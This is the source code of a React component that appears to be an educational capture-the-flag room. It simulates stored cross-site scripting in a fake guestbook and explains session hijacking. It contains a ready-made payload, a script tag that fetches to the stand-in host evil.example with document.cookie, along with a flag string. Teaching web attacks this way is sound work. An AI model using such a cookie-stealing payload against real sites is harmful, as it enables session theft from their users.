import { useState } from 'react';
import RoomShell from '../components/RoomShell';

function Hint({ children }) {
  return <span className="im-hint">{children}</span>;
}
function Code({ children }) {
  return <code className="im-code">{children}</code>;
}

const PAYLOAD = "<script>fetch('https://evil.example/collect?c='+document.cookie)</script>";

const INITIAL_COMMENTS = [
  { user: 'priya_k', text: 'great product, fast shipping!' },
  { user: 'devops_marc', text: "site's a bit slow on mobile tbh" },
];

const INITIAL_DIALOGUE = (
  <>
    Acme's site admin manually reviews every new guestbook comment — you can see that in an old changelog post.
    Whatever you post here, <i>they will open it</i>. <Hint>Try posting something and see what the page does with it.</Hint>
  </>
);
const INITIAL_MECH =
  'Cross-site scripting (XSS) happens when a site takes what someone typed — a comment, a username, a search box — and shows it back on the page without checking it first. If your browser can\'t tell "content" from "code," a comment box becomes a place to run real code in someone else\'s browser.';

export default function XssRoom() {
  const [comments, setComments] = useState(INITIAL_COMMENTS);
  const [input, setInput] = useState('');
  const [filled, setFilled] = useState(false);
  const [log, setLog] = useState('waiting for the admin to check the guestbook…');
  const [dialogue, setDialogue] = useState(INITIAL_DIALOGUE);
  const [mech, setMech] = useState(INITIAL_MECH);
  const [flagShown, setFlagShown] = useState(false);

  function reset() {
    setComments(INITIAL_COMMENTS);
    setInput('');
    setFlagShown(false);
    setLog('waiting for the admin to check the guestbook…');
    setDialogue(INITIAL_DIALOGUE);
    setMech(INITIAL_MECH);
  }

  function hint() {
    setInput(PAYLOAD);
    setFilled(true);
    setTimeout(() => setFilled(false), 1200);
  }

  function submit() {
    const val = input;
    const lower = val.toLowerCase();
    const hasScript = lower.includes('<script');
    const hasCookie = lower.includes('cookie');
    setComments((c) => [...c, { user: 'you', text: val }]);
    setInput('');

    if (!hasScript) {
      setDialogue(
        <>
          That just gets shown as plain text on the page — no different from anyone else's comment. To make the
          browser actually <i>run</i> something when the admin opens this page, it needs a real HTML tag around it:{' '}
          <Hint>&lt;script&gt;...&lt;/script&gt;</Hint> — or click the hint button for a ready-made payload.
        </>
      );
      setLog('admin viewed the page — nothing happened.');
      return;
    }
    if (hasScript && !hasCookie) {
      setDialogue(
        <>
          Good — that script tag actually executes in the admin's browser now, not just displays. But it doesn't do
          anything useful yet. <Hint>Click the hint button for a payload that grabs their session.</Hint>
        </>
      );
      setLog('admin viewed the page — a script ran, but sent nothing.');
      setMech(
        <>
          A &lt;script&gt; tag lets you run real JavaScript inside whoever's browser loads the page — in this scene,
          the admin's. That code runs with their access, not yours, which is what makes this dangerous rather than
          just annoying.
        </>
      );
      return;
    }
    setDialogue(
      "That's it — the moment the admin opened this page, their browser ran your code with their permissions, and handed you their session cookie."
    );
    setMech(
      <>
        <Code>document.cookie</Code> holds a site's session data in the browser, often including the token that says
        "this browser is logged in as the admin." Stealing that and sending it somewhere you control is called
        session hijacking — one of the more damaging things XSS leads to.
      </>
    );
    setLog(
      <>
        admin viewed the page…<br />
        outbound request captured: <span className="im-cap">GET /collect?c=SESSION_9f8e2a...</span>
        <br />
        captured session belongs to: <b>admin</b>
      </>
    );
    setFlagShown(true);
  }

  return (
    <RoomShell
      caseLabel="CASE 0417 — SCENE 3"
      title="The guestbook"
      subtitle="Fake browser · post a comment, see what happens when it's read"
      dialogue={dialogue}
      mech={mech}
      onHint={hint}
      onReset={reset}
      pageTitle="acmewidgets.co/guestbook"
      flag="FLAG{a_c0mm3nt_b0x_1s_c0d3_t00}"
      flagShown={flagShown}
    >
      <div className="im-browser">
        <div className="im-addr-row">
          <div className="im-dots"><span></span><span></span><span></span></div>
          <div className="im-addr-bar">acmewidgets.co/guestbook</div>
        </div>
        <div className="im-page">
          <h3 className="im-page-h2">Guestbook</h3>
          {comments.map((c, i) => (
            <div className="im-comment" key={i}>
              <b>{c.user}</b>{c.text}
            </div>
          ))}
          <div className="im-gform">
            <label className="im-form-label">Post a comment</label>
            <textarea
              className={filled ? 'im-filled' : ''}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="type here..."
            />
            <br />
            <button className="im-post-btn" onClick={submit} type="button">Post</button>
          </div>
          <div className="im-admin-log">{log}</div>
        </div>
      </div>
    </RoomShell>
  );
}
